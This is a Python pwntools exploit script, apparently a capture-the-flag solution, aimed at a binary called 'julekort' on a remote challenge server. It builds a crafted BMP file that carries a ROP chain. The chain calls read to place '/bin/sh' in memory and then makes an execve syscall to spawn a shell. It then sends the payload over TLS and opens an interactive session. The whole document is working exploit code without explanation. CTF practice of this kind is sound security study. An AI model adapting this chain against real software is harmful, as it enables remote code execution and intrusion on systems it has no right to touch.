from pwn import *

bmp = b"BM".ljust(14, b"A")
bmp += b"A"*4
bmp += b"\x00"*196

pop_rdx = 0x000000000041c212 # : pop rdx ; add byte ptr [rax], al ; cmovne rax, rdx ; ret

context.binary = elf = ELF("./julekort")
rop = ROP(elf)
rop.rax = elf.bss(0x10) # since pop rdx gadgets wants to move al into what rax is pointing to, we need a valid pointer in rax
rop.rdi = 0
rop.rsi = elf.bss(0x100) # where we will store /bin/sh
rop.raw(pop_rdx)
rop.raw(8)
rop.raw(elf.sym.read)
rop.rdi = elf.bss(0x100) # pointer to /bin/sh
rop.rsi = 0
rop.rax = elf.bss(0x200) # same again with the pop rdx
rop.raw(pop_rdx)
rop.raw(0)
rop.rax = 59
rop.raw(rop.syscall.address)


bmp += rop.chain()
import base64
with open("image.bmp", "wb") as f:
    f.write(bmp)
p = remote('ikutoppene-c497-julepwn.ept.gg', 1337, ssl=True)
p.sendlineafter(" file:", base64.b64encode(bmp))
p.sendlineafter("image:", "lmao")

#p = process(["./julekort", "flag.txt", "image.bmp", "Dockerfile"])
#p = debug(["./julekort", "flag.txt", "image.bmp", "lol"])

p.sendlineafter("obfuscate", b"/bin/sh\0") # write /bin/sh into elf.bss(0x100)
p.interactive()